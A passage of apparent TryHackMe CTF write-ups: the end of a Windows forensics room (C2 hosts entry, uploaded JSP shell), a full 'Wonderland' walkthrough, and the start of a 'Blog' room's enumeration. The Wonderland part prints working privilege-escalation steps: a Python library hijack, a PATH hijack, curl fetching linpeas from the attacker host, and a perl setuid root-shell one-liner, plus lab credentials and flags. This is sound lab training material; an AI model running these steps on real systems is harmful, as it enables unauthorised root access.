</span></code></pre></div></div> <p>We could have take the hash and check on the internet but we can guess.</p> <p><strong>What tool was used to get Windows passwords?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">mimikatz</code></em></p> <p>For the attackers, they have multiple options to resolve a FQDN to their C2 IP address. The simplest form of it is just by putting an entry in the <em>hosts</em> file. We can check it by retrieving its content. Here we see a suspicious entry, the FQDN google.com or its alias www.google.com is already here.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">C:\Windows\System32\drivers\etc\hosts</span><span class="w">
</span><span class="c"># Copyright (c) 1993-2009 Microsoft Corp.</span><span class="w">
</span><span class="c">#</span><span class="w">
</span><span class="c"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><span class="w">
</span><span class="c">#</span><span class="w">
</span><span class="c"># This file contains the mappings of IP addresses to host names. Each</span><span class="w">
</span><span class="c"># entry should be kept on an individual line. The IP address should</span><span class="w">
</span><span class="c"># be placed in the first column followed by the corresponding host name.</span><span class="w">
</span><span class="c"># The IP address and the host name should be separated by at least one</span><span class="w">
</span><span class="c"># space.</span><span class="w">
</span><span class="c">#</span><span class="w">
</span><span class="c"># Additionally, comments (such as these) may be inserted on individual</span><span class="w">
</span><span class="c"># lines or following the machine name denoted by a '#' symbol.</span><span class="w">
</span><span class="c">#</span><span class="w">
</span><span class="c"># For example:</span><span class="w">
</span><span class="c">#</span><span class="w">
</span><span class="c">#      102.54.94.97     rhino.acme.com          # source server</span><span class="w">
</span><span class="c">#       38.25.63.10     x.acme.com              # x client host</span><span class="w">

</span><span class="c"># localhost name resolution is handled within DNS itself.</span><span class="w">
</span><span class="c">#       127.0.0.1       localhost</span><span class="w">
</span><span class="c">#       ::1             localhost</span><span class="w">
</span><span class="mf">10.2</span><span class="o">.</span><span class="nf">2</span><span class="o">.</span><span class="nf">2</span><span class="w">        </span><span class="n">update.microsoft.com</span><span class="w">
</span><span class="nx">127.0.0.1</span><span class="w">  </span><span class="nx">www.virustotal.com</span><span class="w">
</span><span class="mf">127.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">1</span><span class="w">  </span><span class="n">www.www.com</span><span class="w">
</span><span class="nx">127.0.0.1</span><span class="w">  </span><span class="nx">dci.sophosupd.com</span><span class="w">
</span><span class="mf">10.2</span><span class="o">.</span><span class="nf">2</span><span class="o">.</span><span class="nf">2</span><span class="w">        </span><span class="n">update.microsoft.com</span><span class="w">
</span><span class="nx">127.0.0.1</span><span class="w">  </span><span class="nx">www.virustotal.com</span><span class="w">
</span><span class="mf">127.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">1</span><span class="w">  </span><span class="n">www.www.com</span><span class="w">
</span><span class="nx">127.0.0.1</span><span class="w">  </span><span class="nx">dci.sophosupd.com</span><span class="w">
</span><span class="mf">10.2</span><span class="o">.</span><span class="nf">2</span><span class="o">.</span><span class="nf">2</span><span class="w">        </span><span class="n">update.microsoft.com</span><span class="w">
</span><span class="nx">127.0.0.1</span><span class="w">  </span><span class="nx">www.virustotal.com</span><span class="w">
</span><span class="mf">127.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">1</span><span class="w">  </span><span class="n">www.www.com</span><span class="w">
</span><span class="nx">127.0.0.1</span><span class="w">  </span><span class="nx">dci.sophosupd.com</span><span class="w">
</span><span class="mf">76.32</span><span class="o">.</span><span class="nf">97</span><span class="o">.</span><span class="nf">132</span><span class="w"> </span><span class="n">google.com</span><span class="w">
</span><span class="nx">76.32.97.132</span><span class="w"> </span><span class="nx">www.google.com</span><span class="w">
</span></code></pre></div></div> <p><strong>What was the attackers external control and command servers IP?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">76.32.97.132</code></em></p> <p>Apparently, this server was a probably a webserver because we can see the directory <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot</code> created. That means the attackers could have accessed to the machine using an uploaded malware. This is what the directory contains.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">


    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">3</span><span class="n">/2/2019</span><span class="w">   </span><span class="nx">4:37</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">74853</span><span class="w"> </span><span class="nx">b.jsp</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">3</span><span class="n">/2/2019</span><span class="w">   </span><span class="nx">4:37</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">12572</span><span class="w"> </span><span class="nx">shell.gif</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">3</span><span class="n">/2/2019</span><span class="w">   </span><span class="nx">4:37</span><span class="w"> </span><span class="nx">PM</span><span class="w">            </span><span class="nx">657</span><span class="w"> </span><span class="nx">tests.jsp</span><span class="w">
</span></code></pre></div></div> <p>The server was certainly a java web server.</p> <p><strong>What was the extension name of the shell uploaded via the servers website?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">.jsp</code></em></p> <p>To know what outbound port exception the attacker has made, we can use the <em>Event Viewer</em> at <code class="language-plaintext highlighter-rouge">Applications and Services Logs\Microsoft\Windows\Windows Firewall with Advanced Security\Firewall</code> or we can use a powershell command. When we look and filter at the date <em>3/2/2019</em>, the date of attack, we have to see through all the events to determine which one can be useful.</p> <p><img src="/assets/img/images/thm_ctf_investigating_windows_writeup/Bk4__DgW6.png" alt="Event Viewer"/></p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$eventLogName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"</span><span class="w">
</span><span class="nv">$eventID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2004</span><span class="w">
</span><span class="nv">$targetDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"3/2/2019"</span><span class="w">

</span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="nv">$eventLogName</span><span class="w"> </span><span class="nt">-FilterXPath</span><span class="w"> </span><span class="s2">"*[System[(EventID=</span><span class="nv">$eventID</span><span class="s2">) and TimeCreated[@SystemTime&gt;='</span><span class="si">$(</span><span class="nv">$targetDate</span><span class="o">.</span><span class="nf">AddHours</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="s2">.ToString("</span><span class="nx">yyyy-MM-ddTHH:mm:ss</span><span class="s2">") + "</span><span class="nx">Z</span><span class="s2">")' and @SystemTime&lt;'</span><span class="si">$(</span><span class="nv">$targetDate</span><span class="o">.</span><span class="nf">AddHours</span><span class="p">(</span><span class="nx">24</span><span class="p">)</span><span class="s2">.ToString("</span><span class="nx">yyyy-MM-ddTHH:mm:ss</span><span class="s2">") + "</span><span class="nx">Z</span><span class="s2">")']]]"</span><span class="w"> </span><span class="o">|</span><span class="w"> 
    </span><span class="n">Format-Table</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">TimeCreated</span><span class="p">,</span><span class="w"> </span><span class="nx">Id</span><span class="p">,</span><span class="w"> </span><span class="nx">ProviderName</span><span class="p">,</span><span class="w"> </span><span class="nx">Message</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w">
</span></code></pre></div></div> <blockquote> <p>Not very useful, better use the graphical version.</p> </blockquote> <p><strong>What was the last port the attacker opened?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1337</code></em></p> <p>When we looked at the <em>hosts</em> file, we saw that the site google.com was usurpated. That’s called DNS Poisoning and used to trick the user that the connection being made to the C2 is not malicious.</p> <p><strong>Check for DNS poisoning, what site was targeted?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">google.com</code></em></p>]]></content><author><name></name></author><category term="CTF"/><category term="THM"/><category term="Windows"/><summary type="html"><![CDATA[THM CTF Investigating Windows Writeup]]></summary></entry><entry><title type="html">THM CTF Wonderland</title><link href="https://nonohm.github.io/blog/2023/THM-CTF-Wonderland/" rel="alternate" type="text/html" title="THM CTF Wonderland"/><published>2023-09-27T23:28:26+00:00</published><updated>2023-09-27T23:28:26+00:00</updated><id>https://nonohm.github.io/blog/2023/THM-CTF-Wonderland</id><content type="html" xml:base="https://nonohm.github.io/blog/2023/THM-CTF-Wonderland/"><![CDATA[<h1 id="thm-ctf-wonderland">THM CTF Wonderland</h1> <p>In today’s mission, we’ll have to compromise a machine in order to retrieve flags.</p> <p>To begin with, we scan the machine if there’s an specific opened port with nmap</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-T4</span> 10.10.184.203
Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-09-27 18:03 EDT
Nmap scan report <span class="k">for </span>10.10.108.249
Host is up <span class="o">(</span>0.050s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1.25 seconds
</code></pre></div></div> <p>When we connect to the web page, we see a riddle on Alice in Wonderland theme.</p> <p><img src="/assets/img/images/thm_ctf_wonderland_writeup/rJY43lUxp.png" alt="Follow the white rabbit"/></p> <p>Using ffuf/dirbuster, we can find if there’s any hidden path we can obtain. When the tool has finished, we see 2 available paths.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[/usr/share/seclists/Fuzzing]
└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> 1-4_all_letters_a-z.txt <span class="nt">-u</span> http://10.10.184.203/FUZZ

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.184.203/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
    * FUZZ: r

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
    * FUZZ: img

</span></code></pre></div></div> <p>Following the URL http://10.10.184.203/r, we obtain a second riddle. It says “Keep Going”, so I continue my fuzzing using the last question.</p> <p><img src="/assets/img/images/thm_ctf_wonderland_writeup/SyrHmW8ep.png" alt="Keep Going"/></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[/usr/share/seclists/Fuzzing]
└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> 1-4_all_letters_a-z.txt <span class="nt">-u</span> http://10.10.184.203/r/FUZZ

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.184.203/r/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
    * FUZZ: a

</span></code></pre></div></div> <p>We go through http://10.10.184.203/r/a, and we obtain the same page with “Keep Going”.</p> <p>After keeping doing that, we get http://10.10.184.203/r/a/b/b/i/t, which is ironic because we have the clue since the begining.</p> <p><img src="/assets/img/images/thm_ctf_wonderland_writeup/SJzd8-Iep.png" alt="Open the door and enter wonderland"/></p> <p>By checking the source code, we can see a set of credentials, that might get us to a successful ssh connection to the server.</p> <p><img src="/assets/img/images/thm_ctf_wonderland_writeup/SkX6PWIxa.png" alt="Source code"/></p> <p><code class="language-plaintext highlighter-rouge">alice:HowDothTheLittleCrocodileImproveHisShiningTail</code></p> <p>By connecting with the provided credentials with ssh, we subsequently list if there’s any interesting files.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice@wonderland:~<span class="nv">$ </span><span class="nb">ls
</span>root.txt  walrus_and_the_carpenter.py
</code></pre></div></div> <p>Wz can’t cat the root.txt and when I launch the walrus_and_the_carpenter.py, it prints random strings of a poem on the terminal.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice@wonderland:~<span class="nv">$ </span><span class="nb">cat </span>root.txt 
<span class="nb">cat</span>: root.txt: Permission denied
alice@wonderland:~<span class="nv">$ </span>python3 walrus_and_the_carpenter.py
The line was:    And this was odd, because, you know,
The line was:    
The line was:    <span class="s2">"If this were only cleared away,"</span>
The line was:    <span class="s2">"The butter’s spread too thick!"</span>
The line was:    For some of us are out of breath,
The line was:    And that was scarcely odd, because
The line was:    And more, and more, and more —
The line was:    Swept it <span class="k">for </span>half a year,
The line was:    They wept like anything to see
The line was:    But never a word he said:
alice@wonderland:~<span class="nv">$ </span><span class="nb">cat </span>walrus_and_the_carpenter.py 
import random
poem <span class="o">=</span> <span class="s2">"""The sun was shining on the sea,
Shining with all his might:
...
for i in range(10):
    line = random.choice(poem.split("</span><span class="se">\n</span><span class="s2">"))
    print("</span>The line was:<span class="se">\t</span><span class="s2">", line)
</span></code></pre></div></div> <p>We try to see if I have any sudo permissions. Apparently, the scripts runs using sudo privileges.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice@wonderland:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>alice on wonderland:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User alice may run the following commands on wonderland:
    <span class="o">(</span>rabbit<span class="o">)</span> /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</code></pre></div></div> <p>So we need to change the python random.py script to run bash, using the user rabbit. To see where are the python packages, we run the following command:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice@wonderland:~<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import sys; print(sys.path)'</span>
<span class="o">[</span><span class="s1">''</span>, <span class="s1">'/usr/lib/python36.zip'</span>, <span class="s1">'/usr/lib/python3.6'</span>, <span class="s1">'/usr/lib/python3.6/lib-dynload'</span>, <span class="s1">'/usr/local/lib/python3.6/dist-packages'</span>, <span class="s1">'/usr/lib/python3/dist-packages'</span><span class="o">]</span>
</code></pre></div></div> <p>Thus, we create a random.py containing what we need to escalate. Python will take first the current directory, then the <em>/usr/lib/python36.zip</em>, etc…</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice@wonderland:~<span class="nv">$ </span><span class="nb">cat </span>random.py 
import os

os.system<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span>
</code></pre></div></div> <p>After being able to usurpate the rabbit account, we go the the home foler and we find a setUID elf binary called <code class="language-plaintext highlighter-rouge">teaParty</code>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rabbit@wonderland:/home/rabbit<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 20
<span class="nt">-rwsr-sr-x</span> 1 root root 16816 May 25  2020 teaParty

rabbit@wonderland:/home/rabbit<span class="nv">$ </span>./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sat, 30 Sep 2023 22:19:16 +0000
Ask very nicely, and I will give you some tea <span class="k">while </span>you <span class="nb">wait </span><span class="k">for </span>him

Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</code></pre></div></div> <p>We get a “Segmentation fault (core dumped)” returned string, so we may have to put a special keyword. I’ll analyze the binary by using <code class="language-plaintext highlighter-rouge">strings</code> on my own machine since it’s not available in wonderland. We also can use Ghidra to get more details.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/THM/CTF/Wonderland]
└─<span class="nv">$ </span>strings teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo <span class="nt">-n</span> <span class="s1">'Probably by '</span> <span class="o">&amp;&amp;</span> <span class="nb">date</span> <span class="nt">--date</span><span class="o">=</span><span class="s1">'next hour'</span> <span class="nt">-R</span>
Ask very nicely, and I will give you some tea <span class="k">while </span>you <span class="nb">wait </span><span class="k">for </span>him
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</code></pre></div></div> <p>We see that it always return <em>Segmentation fault (core dumped)</em> whatever we provide to it. We also see it uses date so we can make our own <em>date</em> to elevate our privileges.</p> <p><img src="/assets/img/images/thm_ctf_wonderland_writeup/BJc8Hf8ga.png" alt="date"/></p> <p>We export our new PATH to make our date script being used first instead of the real date.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rabbit@wonderland:/home/rabbit<span class="nv">$ </span><span class="nb">chmod </span>777 ./date
rabbit@wonderland:/home/rabbit<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/rabbit:<span class="nv">$PATH</span>
rabbit@wonderland:/home/rabbit<span class="nv">$ </span>teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit<span class="nv">$ </span>
hatter@wonderland:/home/rabbit<span class="nv">$ </span><span class="nb">cd</span> /home/hatter
hatter@wonderland:/home/hatter<span class="nv">$ </span><span class="nb">cat </span>password.txt 
WhyIsARavenLikeAWritingDesk?

</code></pre></div></div> <p>We use linpeas to search if there’s any vulnerabilities on the system. We can send it using <code class="language-plaintext highlighter-rouge">python -m http.server 8080</code> on our attacker machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
hatter@wonderland:/home/hatter<span class="nv">$ </span>curl 10.11.24.118:8080/linpeas.sh <span class="o">&gt;</span> linpeas.sh 
hatter@wonderland:/home/hatter<span class="nv">$ </span><span class="nb">chmod </span>700 ./linpeas.sh
</code></pre></div></div> <p>Before executing it, we’ll use an ssh connection to avoid any problems in the future.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>ssh hatter@10.10.184.203                        
hatter@10.10.184.203<span class="s1">'s password:
hatter@wonderland:~$ ./linpeas.sh
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
</span></code></pre></div></div> <p>In the capabilities part, we are able to use perl as the setUID capability is present, put by root user. On GTFObins, we see the following advice:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Capabilities

If the binary has the Linux CAP_SETUID capability <span class="nb">set </span>or it is executed by another binary with the capability <span class="nb">set</span>, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

    <span class="nb">cp</span> <span class="si">$(</span>which perl<span class="si">)</span> <span class="nb">.</span>
    <span class="nb">sudo </span>setcap cap_setuid+ep perl

    ./perl <span class="nt">-e</span> <span class="s1">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
</code></pre></div></div> <p>With this given, we just use the command with <em>hatter</em>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hatter@wonderland:~<span class="nv">$ </span>perl <span class="nt">-e</span> <span class="s1">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
<span class="c"># </span>
<span class="c"># whoami</span>
root
<span class="c"># find / -name 'user.txt'</span>
/root/user.txt
<span class="c"># cat /root/user.txt</span>
thm<span class="o">{</span><span class="s2">"Curiouser and curiouser!"</span><span class="o">}</span>
<span class="c"># cat /home/alice/root.txt</span>
thm<span class="o">{</span>Twinkle, twinkle, little bat! How I wonder what you’re at!<span class="o">}</span>
</code></pre></div></div> <p>We succesfully retrieved the flag in <code class="language-plaintext highlighter-rouge">/root/user.txt</code> and in <code class="language-plaintext highlighter-rouge">/home/alice/root.txt</code></p> <p><strong>Obtain the flag in user.txt</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">thm{"Curiouser and curiouser!"}</code></em></p> <p><strong>Escalate your privileges, what is the flag in root.txt?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}</code></em></p>]]></content><author><name></name></author><category term="THM"/><category term="CTF"/><category term="Wonderland"/><summary type="html"><![CDATA[THM CTF Wonderland]]></summary></entry><entry><title type="html">THM CTF Blog</title><link href="https://nonohm.github.io/blog/2023/THM-CTF-Blog/" rel="alternate" type="text/html" title="THM CTF Blog"/><published>2023-09-21T23:30:34+00:00</published><updated>2023-09-21T23:30:34+00:00</updated><id>https://nonohm.github.io/blog/2023/THM-CTF-Blog</id><content type="html" xml:base="https://nonohm.github.io/blog/2023/THM-CTF-Blog/"><![CDATA[<h1 id="thm-ctf-blog">THM CTF Blog</h1> <h2 id="introduction">Introduction</h2> <p>In today’s writeup, we’ll try to enumerate and find flags on the machine which hosts the new blog of Billy Joel.</p> <h2 id="walkthrough">Walkthrough</h2> <p>To begin with, we’ll fisrtly add blog.thm to our <em>/etc/hosts</em> file (I’m working with kali linux). (Don’t forget to connect with openvpn to the network)</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nano /etc/hosts
10.10.180.6 blog.thm
</code></pre></div></div> <p>Then, I’ll go for a quick nmap scan.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>nmap <span class="nt">-sT</span> <span class="nt">-T4</span> blog.thm
Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-10 15:00 EDT
Nmap scan report <span class="k">for </span>blog.thm <span class="o">(</span>10.10.180.6<span class="o">)</span>
Host is up <span class="o">(</span>0.089s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>2.15 seconds
</code></pre></div></div> <p>We see the machine may host a webservice. When I try to connect to it using a browser, I’m welcomed with this.</p> <p><img src="/assets/img/images/thm_ctf_blog/BkITB77-a.png" alt="Website"/></p> <p>I use ffuf to fuzz the website and eventually get an interesting path.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/usr/share/seclists/Fuzzing]
└─# ffuf <span class="nt">-w</span> fuzz-Bo0oM.txt <span class="nt">-u</span> http://blog.thm/FUZZ

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://blog.thm/FUZZ
 :: Wordlist         : FUZZ: fuzz-Bo0oM.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________


adm/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 400ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 447ms]
admin/                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 357ms]
admin/index.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 395ms]
admin/mysql/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 406ms]
admin/phpmyadmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 391ms]
admin/PMA/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 381ms]
admin/pma/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 381ms]
admin/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 395ms]
admin/phpmyadmin2/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]
admin/mysql2/index.php  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 418ms]
admin2/index.php        [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 430ms]
admin_area/index.php    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 437ms]
adminarea/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 413ms]
administrator/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 400ms]
apc/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 420ms]
asset..                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 391ms]
axis//happyaxis.jsp     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 451ms]
axis2-web//HappyAxis.jsp [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 472ms]
axis2//axis2-web/HappyAxis.jsp [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 455ms]
bb-admin/index.php      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 390ms]
bitrix/admin/index.php  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 423ms]
claroline/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 448ms]
db/index.php            [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 394ms]
dbadmin/index.php       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 440ms]
dswsbobje//happyaxis.jsp [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 454ms]
etc/lib/pChart2/examples/imageMap/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 432ms]
extjs/resources//charts.swf [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 426ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 454ms]
install/index.php?upgrade/ [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 438ms]
jboss-net//happyaxis.jsp [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 390ms]
license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 41ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 434ms]
login/                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 431ms]
modelsearch/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 402ms]
myadmin/index.php       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 398ms]
myadmin2/index.php      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 418ms]
mysql-admin/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 389ms]
mysql/index.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
mysqladmin/index.php    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 431ms]
New%20folder%20(2)      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 411ms]
panel-administracion/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 441ms]
phpadmin/index.php      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 439ms]
